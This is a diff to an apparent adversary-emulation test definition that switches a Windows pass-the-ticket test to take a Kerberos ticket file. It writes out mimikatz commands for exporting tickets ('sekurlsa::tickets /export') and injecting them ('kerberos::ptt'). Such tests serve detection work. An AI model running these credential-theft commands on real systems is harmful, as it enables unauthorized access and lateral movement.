@@ -8,8 +8,8 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
-    user_name:
-      description: username
+    ticket:
+      description: Ticket file name usually format of 'id-username\@domain.kirbi' (e.g. can be dumped by "sekurlsa::tickets /export" module)
       type: String
       default: Administrator
     domain:
@@ -35,5 +35,5 @@ atomic_tests:
       Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
   executor:
     command: |
-      #{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}
+      #{mimikatz_exe} "kerberos::ptt #{ticket}"
     name: command_prompt
